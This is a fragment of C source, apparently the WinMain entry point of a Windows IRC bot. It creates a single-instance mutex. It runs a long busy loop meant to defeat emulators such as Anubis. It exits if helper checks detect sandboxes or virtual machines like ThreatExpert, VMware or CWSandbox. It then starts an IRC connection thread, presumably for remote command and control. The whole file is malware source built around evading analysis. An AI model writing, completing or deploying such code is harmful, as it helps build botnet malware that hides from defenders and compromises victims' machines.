#include "includes.h"
#include "Config.h"

char CurrentName[1024];
HANDLE xetum;

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)	
{
	char		currentfile[MAX_PATH] = {0},
				destination[MAX_PATH] = {0};
	
	SetErrorMode(SEM_NOGPFAULTERRORBOX);
	Sleep(400);
	
    //mutex-check
	xetum = CreateMutex(NULL, FALSE, cfg_mutex);
	if (GetLastError() == ERROR_ALREADY_EXISTS)
		ExitProcess(0);
			
	//anti//anubis/emulators
    DWORD x = 0;
    for (x; x < 0xFFFFFFFF; x++); 
	
	//anti//threat expert/vmware/cswsandbox/sunbelt(sandbox)/normansandbox/sandbox(ie)
	if (UserCheck() == TRUE) { ExitProcess(0); }
	if (ModuleCheck() == TRUE) { ExitProcess(0); }
 
    //connect
	char test[1] = "";
	IRC_Thread((void*)test);
 
	return 0;
}
